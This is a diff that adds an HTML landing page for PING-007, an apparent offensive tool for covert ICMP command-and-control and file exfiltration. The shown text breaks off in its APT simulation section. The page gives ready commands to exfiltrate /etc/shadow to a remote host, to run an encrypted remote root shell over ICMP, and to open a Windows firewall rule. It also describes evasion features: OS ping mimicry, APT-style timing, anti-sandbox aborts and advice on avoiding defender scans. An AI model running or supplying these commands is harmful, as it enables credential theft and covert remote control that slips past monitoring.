@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PING-007 - Covert ICMP Framework</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" />
+<style>
+/* ── BASE ──────────────────────────────────────────── */
+:root {
+  --black:    #000000;
+  --dark:     #0a0a0a;
+  --card:     #111111;
+  --border:   #1e1e1e;
+  --gold:     #c9a84c;
+  --gold-dim: rgba(201,168,76,.12);
+  --gold-glow:rgba(201,168,76,.06);
+  --silver:   #9a9a9a;
+  --white:    #f0f0f0;
+  --red:      #7b1818;
+  --mono:     "JetBrains Mono", monospace;
+  --serif:    "Playfair Display", serif;
+  --sans:     "Inter", sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; font-size: 15px; }
+body {
+  background: var(--black); color: var(--white);
+  font-family: var(--sans); line-height: 1.65;
+  -webkit-font-smoothing: antialiased; overflow-x: hidden;
+}
+::selection { background: var(--gold); color: #000; }
+a { color: inherit; text-decoration: none; }
+
+.container { max-width: 1280px; margin: 0 auto; padding: 0 40px; }
+
+/* ── NAV ───────────────────────────────────────────── */
+nav {
+  position: fixed; inset: 0 0 auto 0; z-index: 100;
+  background: rgba(0,0,0,.92); backdrop-filter: blur(16px);
+  border-bottom: 1px solid rgba(201,168,76,.25);
+}
+.nav-inner {
+  display: flex; align-items: center; justify-content: space-between;
+  height: 60px;
+}
+.nav-brand {
+  display: flex; align-items: center; gap: 14px;
+  font-family: var(--serif); font-size: 20px; font-weight: 700;
+  letter-spacing: .04em; color: var(--white);
+}
+.nav-emblem {
+  width: 32px; height: 32px; border-radius: 50%;
+  background: var(--gold);
+  display: grid; place-items: center;
+}
+.nav-links { display: flex; gap: 36px; }
+.nav-links a {
+  font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: .1em;
+  color: var(--silver); transition: color .25s;
+}
+.nav-links a:hover { color: var(--gold); }
+.nav-gh {
+  display: flex; align-items: center; gap: 8px; padding: 7px 16px;
+  border: 1px solid rgba(201,168,76,.4); border-radius: 3px;
+  font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: .08em;
+  color: var(--gold); transition: background .25s, border-color .25s;
+}
+.nav-gh:hover { background: var(--gold-dim); border-color: var(--gold); }
+
+/* ── HERO ──────────────────────────────────────────── */
+.hero {
+  min-height: 100vh; display: flex; align-items: center;
+  position: relative; overflow: hidden;
+  background: radial-gradient(ellipse 80% 60% at 50% 110%, rgba(201,168,76,.07) 0%, transparent 70%);
+}
+.hero-ring {
+  position: absolute; border-radius: 50%;
+  border: 1px solid rgba(201,168,76,.1);
+  top: 50%; left: 50%; transform: translate(-50%,-50%);
+}
+.hero-ring:nth-child(1) { width: 700px; height: 700px; animation: spin 80s linear infinite; }
+.hero-ring:nth-child(2) { width: 500px; height: 500px; border-style: dashed; animation: spin -50s linear infinite; }
+.hero-ring:nth-child(3) { width: 300px; height: 300px; animation: spin 35s linear infinite; }
+@keyframes spin {
+  to { transform: translate(-50%,-50%) rotate(360deg); }
+}
+.hero-content { position: relative; z-index: 2; text-align: center; max-width: 780px; margin: 0 auto; padding-top: 60px; }
+.hero-tag {
+  display: inline-flex; align-items: center; gap: 10px; margin-bottom: 48px;
+  padding: 6px 16px; border: 1px solid rgba(201,168,76,.3); border-radius: 2px;
+  font-family: var(--mono); font-size: 11px; letter-spacing: .12em; color: var(--gold);
+  text-transform: uppercase;
+}
+.hero-tag::before { content: ''; width: 6px; height: 6px; background: var(--gold); border-radius: 50%; animation: pulse 2s ease-in-out infinite; }
+@keyframes pulse { 0%,100%{opacity:1}50%{opacity:.3} }
+.hero-number {
+  font-family: var(--serif); font-size: 140px; font-weight: 900;
+  line-height: .85; color: transparent;
+  background: linear-gradient(160deg, #fff 20%, var(--gold) 60%, #7a5e20 100%);
+  -webkit-background-clip: text; background-clip: text;
+  letter-spacing: -.02em;
+}
+.hero-title {
+  margin-top: 24px;
+  font-family: var(--mono); font-size: 12px; letter-spacing: .25em;
+  text-transform: uppercase; color: var(--silver);
+}
+.hero-desc {
+  margin: 32px auto 0; max-width: 560px;
+  font-size: 17px; color: #bbb; line-height: 1.75;
+}
+.hero-actions { display: flex; gap: 16px; justify-content: center; margin-top: 48px; }
+.btn {
+  display: inline-flex; align-items: center; gap: 10px; padding: 13px 28px;
+  font-size: 12px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase;
+  border-radius: 3px; transition: all .25s; cursor: pointer;
+}
+.btn-gold { background: var(--gold); color: #000; }
+.btn-gold:hover { background: #e0b84e; }
+.btn-outline { border: 1px solid rgba(201,168,76,.4); color: var(--gold); }
+.btn-outline:hover { background: var(--gold-dim); border-color: var(--gold); }
+.hero-stats {
+  display: flex; gap: 48px; justify-content: center; margin-top: 72px;
+  padding-top: 48px; border-top: 1px solid var(--border);
+}
+.hero-stat { text-align: center; }
+.hero-stat .val { font-family: var(--serif); font-size: 36px; font-weight: 700; color: var(--gold); }
+.hero-stat .lbl { font-size: 10px; font-weight: 600; letter-spacing: .12em; text-transform: uppercase; color: var(--silver); margin-top: 4px; }
+
+/* ── SECTION BASE ──────────────────────────────────── */
+section { padding: 100px 0; }
+.sec-label {
+  font-family: var(--mono); font-size: 10px; letter-spacing: .2em;
+  text-transform: uppercase; color: var(--gold); margin-bottom: 14px;
+}
+.sec-title {
+  font-family: var(--serif); font-size: 42px; font-weight: 700;
+  color: var(--white); line-height: 1.15; margin-bottom: 16px;
+}
+.sec-sub { font-size: 16px; color: var(--silver); max-width: 540px; }
+.sec-head { margin-bottom: 60px; }
+.sec-head.center { text-align: center; }
+.sec-head.center .sec-sub { margin: 0 auto; }
+
+/* ── GRID ──────────────────────────────────────────── */
+.grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: var(--border); border: 1px solid var(--border); }
+.grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px; }
+.grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: var(--border); border: 1px solid var(--border); }
+
+/* ── FEATURE CARDS ─────────────────────────────────── */
+.feat {
+  background: var(--card); padding: 36px 32px;
+  transition: background .25s;
+  position: relative; overflow: hidden;
+}
+.feat::before {
+  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+  background: linear-gradient(90deg, transparent, var(--gold), transparent);
+  opacity: 0; transition: opacity .3s;
+}
+.feat:hover { background: #141414; }
+.feat:hover::before { opacity: 1; }
+.feat-icon { width: 24px; height: 24px; margin-bottom: 20px; }
+.feat-icon svg { stroke: var(--gold); }
+.feat h3 { font-size: 15px; font-weight: 600; color: var(--white); margin-bottom: 10px; }
+.feat p { font-size: 13px; color: var(--silver); line-height: 1.65; }
+
+/* ── SPEC BLOCKS ───────────────────────────────────── */
+.spec {
+  background: var(--card); padding: 28px 24px;
+  transition: background .2s;
+}
+.spec:hover { background: #141414; }
+.spec-label { font-family: var(--mono); font-size: 10px; letter-spacing: .12em; text-transform: uppercase; color: var(--gold); margin-bottom: 10px; }
+.spec-val { font-family: var(--mono); font-size: 13px; color: var(--silver); line-height: 1.5; }
+
+/* ── CODE BLOCK ────────────────────────────────────── */
+.term {
+  background: #0d0d0d; border: 1px solid var(--border); border-radius: 6px;
+  overflow: hidden; margin: 16px 0;
+}
+.term-bar {
+  display: flex; align-items: center; gap: 8px; padding: 10px 16px;
+  background: #141414; border-bottom: 1px solid var(--border);
+}
+.term-dot { width: 10px; height: 10px; border-radius: 50%; }
+.term-dot:nth-child(1) { background: #ff5f56; }
+.term-dot:nth-child(2) { background: #ffbd2e; }
+.term-dot:nth-child(3) { background: #27c93f; }
+.term-title { font-family: var(--mono); font-size: 11px; color: #555; margin-left: 8px; }
+.term-body { padding: 20px 24px; font-family: var(--mono); font-size: 13px; line-height: 1.8; overflow-x: auto; }
+.term-body .prompt { color: #555; user-select: none; }
+.term-body .cmd { color: var(--white); }
+.term-body .arg { color: #7ec8e3; }
+.term-body .flag { color: #c3e88d; }
+.term-body .str { color: #c3e88d; }
+.term-body .comment { color: #555; font-style: italic; }
+.term-body .out { color: var(--gold); }
+.term-body .warn { color: #f78c6c; }
+
+/* ── ALGO TABLE ────────────────────────────────────── */
+.algo-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 12px; }
+.algo-table th {
+  padding: 12px 16px; text-align: left;
+  font-size: 10px; letter-spacing: .1em; text-transform: uppercase;
+  color: var(--gold); border-bottom: 1px solid var(--border);
+}
+.algo-table td { padding: 14px 16px; color: var(--silver); border-bottom: 1px solid #111; }
+.algo-table tr:hover td { background: #0d0d0d; color: var(--white); }
+.badge {
+  display: inline-block; padding: 2px 8px; border-radius: 2px; font-size: 10px;
+  font-weight: 600; letter-spacing: .06em; text-transform: uppercase;
+}
+.badge-green { background: rgba(39,201,63,.15); color: #27c93f; }
+.badge-gold  { background: var(--gold-dim); color: var(--gold); }
+.badge-grey  { background: rgba(154,154,154,.12); color: var(--silver); }
+.badge-red   { background: rgba(123,24,24,.3); color: #e07070; }
+
+/* ── WIRE FORMAT ────────────────────────────────────── */
+.wire {
+  display: flex; gap: 4px; align-items: stretch;
+  font-family: var(--mono); font-size: 11px; margin: 20px 0;
+}
+.wire-block {
+  flex: 1; display: flex; flex-direction: column; align-items: center;
+  gap: 6px; padding: 12px 8px;
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 4px; text-align: center;
+  transition: border-color .2s;
+}
+.wire-block:hover { border-color: var(--gold); }
+.wire-block .size { color: var(--gold); font-size: 10px; }
+.wire-block .name { color: var(--white); font-size: 12px; }
+.wire-block .desc { color: var(--silver); font-size: 10px; }
+
+/* ── DIVIDER ────────────────────────────────────────── */
+.divider { height: 1px; background: var(--border); margin: 0; }
+
+/* ── APT PROFILES ───────────────────────────────────── */
+.apt-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
+.apt-card {
+  padding: 24px; background: var(--card); border: 1px solid var(--border); border-radius: 4px;
+  transition: border-color .25s, background .25s;
+}
+.apt-card:hover { border-color: var(--gold); background: #111; }
+.apt-name { font-family: var(--mono); font-size: 12px; color: var(--gold); margin-bottom: 6px; text-transform: uppercase; letter-spacing: .06em; }
+.apt-group { font-size: 12px; color: var(--silver); margin-bottom: 12px; }
+.apt-timing { font-family: var(--mono); font-size: 13px; color: var(--white); font-weight: 600; }
+.apt-sub { font-family: var(--mono); font-size: 11px; color: #555; }
+
+/* ── FOOTER ─────────────────────────────────────────── */
+footer {
+  padding: 60px 0;
+  background: var(--dark); border-top: 1px solid var(--border);
+}
+.foot-inner { display: flex; align-items: center; justify-content: space-between; gap: 32px; flex-wrap: wrap; }
+.foot-brand { display: flex; align-items: center; gap: 14px; }
+.foot-copy { font-family: var(--mono); font-size: 11px; color: #444; }
+.foot-links { display: flex; gap: 28px; }
+.foot-links a { font-size: 12px; color: var(--silver); transition: color .2s; }
+.foot-links a:hover { color: var(--gold); }
+.foot-version { font-family: var(--mono); font-size: 10px; color: #333; letter-spacing: .06em; text-transform: uppercase; }
+
+/* ── RESPONSIVE ─────────────────────────────────────── */
+@media (max-width: 900px) {
+  .hero-number { font-size: 90px; }
+  .grid-3 { grid-template-columns: 1fr; }
+  .grid-4 { grid-template-columns: repeat(2, 1fr); }
+  .apt-grid { grid-template-columns: repeat(2, 1fr); }
+  .nav-links { display: none; }
+  .hero-stats { gap: 28px; flex-wrap: wrap; }
+}
+@media (max-width: 600px) {
+  .container { padding: 0 20px; }
+  .hero-number { font-size: 72px; }
+  .sec-title { font-size: 32px; }
+  .grid-2, .apt-grid { grid-template-columns: 1fr; }
+  .grid-4 { grid-template-columns: 1fr; }
+  .hero-actions { flex-direction: column; align-items: center; }
+  .wire { flex-wrap: wrap; }
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="container">
+    <div class="nav-inner">
+      <div class="nav-brand">
+        <div class="nav-emblem"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#000" stroke-width="1.4"><circle cx="8" cy="8" r="6"/><circle cx="8" cy="8" r="2.5" fill="#000" stroke="none"/></svg></div>
+        PING-007
+      </div>
+      <div class="nav-links">
+        <a href="#quickstart">Quickstart</a>
+        <a href="#commands">Commands</a>
+        <a href="#crypto">Protocol</a>
+        <a href="#evasion">Evasion</a>
+        <a href="#build">Build</a>
+      </div>
+      <a class="nav-gh btn btn-outline" href="https://github.com/franckferman/ping-007">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.44 9.8 8.2 11.38.6.1.82-.26.82-.57v-2c-3.34.72-4.04-1.61-4.04-1.61-.54-1.38-1.33-1.75-1.33-1.75-1.08-.74.08-.72.08-.72 1.2.08 1.83 1.23 1.83 1.23 1.06 1.82 2.79 1.3 3.47.99.1-.77.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.23-3.22-.12-.3-.53-1.52.12-3.18 0 0 1.01-.32 3.3 1.23a11.5 11.5 0 0 1 3-.4c1.02 0 2.04.13 3 .4 2.28-1.55 3.29-1.23 3.29-1.23.65 1.66.24 2.88.12 3.18.77.84 1.23 1.91 1.23 3.22 0 4.61-2.81 5.63-5.48 5.92.43.37.81 1.1.81 2.22v3.29c0 .32.21.68.82.57C20.56 21.8 24 17.3 24 12 24 5.37 18.63 0 12 0z"/></svg>
+        GitHub
+      </a>
+    </div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-ring"></div>
+  <div class="hero-ring"></div>
+  <div class="hero-ring"></div>
+  <div class="container">
+    <div class="hero-content">
+      <div class="hero-tag">Covert Communications Framework</div>
+      <div class="hero-number">007</div>
+      <div class="hero-title">PING-007 v3.0.1 · Stealth ICMP C2 &amp; Exfiltration</div>
+      <p class="hero-desc">
+        Embed AES-256-GCM encrypted data inside packets indistinguishable from real OS pings.
+        Multi-packet stealth reassembly, bidirectional C2 shell, timing profiles,
+        OS signature mimicry - built for authorized red team operations.
+      </p>
+      <div class="hero-actions">
+        <a href="#quickstart" class="btn btn-gold">Quick Start ↓</a>
+        <a href="https://github.com/franckferman/ping-007" class="btn btn-outline">View Source</a>
+      </div>
+      <div class="hero-stats">
+        <div class="hero-stat"><div class="val">3</div><div class="lbl">Crypto Algorithms</div></div>
+        <div class="hero-stat"><div class="val">64B</div><div class="lbl">Stealth Packet Size</div></div>
+        <div class="hero-stat"><div class="val">4</div><div class="lbl">APT Profiles</div></div>
+        <div class="hero-stat"><div class="val">CAP_NET_RAW</div><div class="lbl">Requirement</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- FEATURES -->
+<section id="features" style="background: var(--dark);">
+  <div class="container">
+    <div class="sec-head center">
+      <div class="sec-label">Capabilities</div>
+      <h2 class="sec-title">What it does</h2>
+      <p class="sec-sub">ICMP as a covert channel: AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC encryption with per-session algorithm rotation and full evasion stack.</p>
+    </div>
+    <div class="grid-3">
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+        <h3>AES-256-GCM Encryption</h3>
+        <p>Three AEAD algorithms (AES-256-GCM, ChaCha20-Poly1305, XOR-CFB-HMAC) with PBKDF2-SHA256 key derivation. Fixed per-algorithm salts enable deterministic key generation from a shared password — no key exchange needed.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="currentColor" stroke="none"/></svg></div>
+        <h3>OS Signature Mimicry</h3>
+        <p>Replicates byte patterns of real Linux ping (56-byte sequential) or Windows ping (32-byte alphabetic). Encrypted data is XOR-embedded into the authentic pattern. From the network, it looks like a standard ping.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+        <h3>Bidirectional C2 Shell</h3>
+        <p>Interactive shell over ICMP. Operator sends <code style="font-family:var(--mono);font-size:12px;color:var(--gold)">CMD:&lt;id&gt;:&lt;command&gt;</code> packets; agent executes and replies <code style="font-family:var(--mono);font-size:12px;color:var(--gold)">RESP:&lt;id&gt;:&lt;rc&gt;:&lt;stdout&gt;</code>. Entire exchange is encrypted.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></div>
+        <h3>File Exfiltration &amp; Reassembly</h3>
+        <p>Chunks any file into encrypted ICMP packets with ±25% size jitter per chunk. When stealth mode is active, each chunk is split across multiple 64-byte pings (indistinguishable from <code style="font-family:var(--mono);font-size:12px;color:var(--gold)">ping -s 56</code>) with a 4-byte hidden fragment header. The listener reassembles all fragments before decryption.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+        <h3>Timing Profiles</h3>
+        <p>Lazarus (5 min–1 hr), APT29 (30 min–2 hr), APT28 (10–30 min), Equation Group (1–3 days). Per-chunk adaptive delay blends long-running exfiltration into legitimate background traffic.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <h3>Anti-Sandbox Detection</h3>
+        <p>Checks system uptime, process count, and available resources on startup. Aborts before sending a single packet if sandbox indicators are detected. Thresholds configurable via <code style="font-family:var(--mono);font-size:12px;color:var(--gold)">config/ping-007.yml</code>.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- QUICKSTART -->
+<section id="quickstart">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-label">Getting started</div>
+      <h2 class="sec-title">Quick Start</h2>
+      <p class="sec-sub">Requires Go 1.25+ and elevated privileges for raw ICMP sockets.</p>
+    </div>
+
+    <!-- Privilege requirements per platform -->
+    <div style="margin-bottom:40px;">
+      <table class="algo-table" style="background:var(--card);">
+        <thead>
+          <tr><th>Platform</th><th>Requirement</th><th>Workaround</th><th>Note</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Linux / macOS</td>
+            <td><code style="font-family:var(--mono)">sudo</code> or <code style="font-family:var(--mono)">CAP_NET_RAW</code></td>
+            <td><code style="font-family:var(--mono)">sudo setcap cap_net_raw+ep ./ping-007</code></td>
+            <td><span class="badge badge-gold">OPSEC</span> setcap writes a readable xattr on the binary — defenders scan for it. Use sudo in real ops.</td>
+          </tr>
+          <tr>
+            <td>Windows</td>
+            <td>Administrator (elevated terminal)</td>
+            <td>None — no capability system on Windows</td>
+            <td>Inbound ICMP blocked by Windows Defender by default (see below). Loopback testing doesn't work on Windows raw sockets.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Windows host firewall note -->
+    <div style="margin-bottom:40px;padding:20px 24px;background:var(--card);border:1px solid var(--border);border-left:3px solid var(--gold);">
+      <p style="font-family:var(--mono);font-size:11px;color:var(--gold);text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px;">Windows — listener setup</p>
+      <p style="font-size:13px;color:var(--silver);margin-bottom:14px;line-height:1.7;">
+        On Windows, the <strong style="color:var(--white)">host firewall</strong> (Windows Defender) blocks inbound ICMP echo by default.
+        The sender works without changes, but the listener won't receive packets until you open it:
+      </p>
+      <div class="term" style="margin:0 0 12px;">
+        <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span class="term-title">PowerShell (Administrator)</span></div>
+        <div class="term-body">
+<span class="comment"># Open inbound ICMP echo on the host firewall (listener side only)</span><br>
+<span class="cmd">netsh advfirewall firewall add rule</span> <span class="flag">name=</span><span class="str">"ICMP Allow"</span> <span class="flag">protocol=</span>icmpv4:8,any <span class="flag">dir=</span>in <span class="flag">action=</span>allow<br><br>
+<span class="comment"># Remove after testing</span><br>
+<span class="cmd">netsh advfirewall firewall delete rule</span> <span class="flag">name=</span><span class="str">"ICMP Allow"</span>
+        </div>
+      </div>
+      <p style="font-size:12px;color:#666;line-height:1.6;">
+        <strong style="color:var(--silver)">On enterprise networks</strong>, this is usually not needed — ICMP is almost universally allowed on corporate LANs because network teams rely on it for troubleshooting (ping, traceroute, path MTU discovery). The Windows Defender rule above only applies to the <em>local host firewall</em>, not to network-level policy. This is what makes ICMP a reliable lateral movement channel: the traffic blends with normal infrastructure monitoring.
+      </p>
+    </div>
+
+    <div class="grid-2">
+      <div>
+        <p style="color:var(--silver);margin-bottom:12px;font-size:13px;">Build</p>
+        <div class="term">
+          <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span class="term-title">terminal</span></div>
+          <div class="term-body">
+<span class="prompt">$ </span><span class="cmd">git clone</span> <span class="str">https://github.com/franckferman/ping-007</span><br>
+<span class="prompt">$ </span><span class="cmd">cd</span> ping-007<br>
+<span class="prompt">$ </span><span class="cmd">make build</span><br>
+<span class="out">Build complete: build/ping-007</span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <p style="color:var(--silver);margin-bottom:12px;font-size:13px;">Send an encrypted message</p>
+        <div class="term">
+          <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span class="term-title">terminal</span></div>
+          <div class="term-body">
+<span class="comment"># Receiver (start first)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 listen</span> <span class="flag">-o</span> ./loot <span class="flag">-p</span> <span class="str">"secret"</span> <span class="flag">--timeout</span> 60<br><br>
+<span class="comment"># Sender</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 basic</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-d</span> <span class="str">"data"</span> <span class="flag">-p</span> <span class="str">"secret"</span><br>
+<span class="out">Packet 1/1 sent (60 bytes)</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div style="margin-top:32px;">
+      <p style="color:var(--silver);margin-bottom:12px;font-size:13px;">Without <code style="font-family:var(--mono);color:var(--gold)">-p</code> — what NOT to do</p>
+      <div class="term">
+        <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+        <div class="term-body">
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 basic</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-d</span> <span class="str">"data"</span>  <span class="comment"># no -p</span><br>
+<span class="warn">Warning: No password - using random keys (non-interoperable)</span><br>
+<span class="comment"># Receiver gets encrypted bytes it cannot decrypt → useless</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- COMMANDS -->
+<section id="commands" style="background: var(--dark);">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-label">Reference</div>
+      <h2 class="sec-title">Commands</h2>
+    </div>
+
+    <!-- basic -->
+    <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">basic — send a message</h3>
+    <div class="term" style="margin-bottom:40px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># Encrypted</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 basic</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">-d</span> <span class="str">"payload"</span><br><br>
+<span class="comment"># Windows signature + human timing (blend in)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 basic</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">-d</span> <span class="str">"data"</span> <span class="flag">--signature</span> windows <span class="flag">--human-timing</span><br><br>
+<span class="comment"># Maximum evasion</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 basic</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">-d</span> <span class="str">"data"</span> <span class="flag">--ultra-stealth</span>
+      </div>
+    </div>
+
+    <!-- stealth -->
+    <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">stealth — full evasion stack</h3>
+    <div class="term" style="margin-bottom:40px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># Sandbox detection + adaptive timing + OS mimicry, all in one</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 stealth</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">-d</span> <span class="str">"payload"</span>
+      </div>
+    </div>
+
+    <!-- exfil -->
+    <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">exfil — file exfiltration</h3>
+    <div class="term" style="margin-bottom:40px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># Fast (no APT delays)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 exfil</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-f</span> /etc/shadow <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">--mode</span> fast<br><br>
+<span class="comment"># Stealth (APT timing per chunk, default)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 exfil</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-f</span> dump.zip <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">--chunk-size</span> 128<br><br>
+<span class="comment"># Plaintext (no encryption)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 exfil</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-f</span> data.txt <span class="flag">--no-encrypt</span>
+      </div>
+    </div>
+
+    <!-- shell -->
+    <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">shell — bidirectional C2</h3>
+    <div class="term" style="margin-bottom:40px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># 1 — Start listener on target</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 listen</span> <span class="flag">-o</span> /tmp/c2 <span class="flag">-p</span> <span class="str">"c2pass"</span> <span class="flag">--timeout</span> 3600<br><br>
+<span class="comment"># 2 — Operator shell (another machine)</span><br>
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 shell</span> <span class="flag">-t</span> &lt;TARGET_IP&gt; <span class="flag">-p</span> <span class="str">"c2pass"</span><br>
+<span class="out">ping-007&gt; </span><span class="cmd">id</span><br>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span><br>
+<span class="out">ping-007&gt; </span><span class="cmd">whoami</span><br>
+<span class="out">root</span><br>
+<span class="out">ping-007&gt; </span><span class="cmd">exit</span>
+      </div>
+    </div>
+
+    <!-- listen -->
+    <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">listen — receive &amp; decrypt</h3>
+    <div class="term" style="margin-bottom:40px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 listen</span> <span class="flag">-o</span> ./loot <span class="flag">-p</span> <span class="str">"key"</span> <span class="flag">--timeout</span> 300<br>
+<span class="out">Listening for incoming data...</span><br>
+<span class="out">Received packet from 10.0.0.5 (60 bytes)</span><br>
+<span class="out">Successfully decrypted data (20 bytes)</span><br>
+<span class="out">Saved to: ./loot/received_10.0.0.5_1234567890.bin</span>
+      </div>
+    </div>
+
+    <!-- apt -->
+    <div class="grid-2">
+      <div>
+        <h3 style="font-family:var(--mono);font-size:15px;color:var(--gold);margin-bottom:16px;">apt — APT simulation</h3>
+        <div class="term">
+          <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+          <div class="term-body">
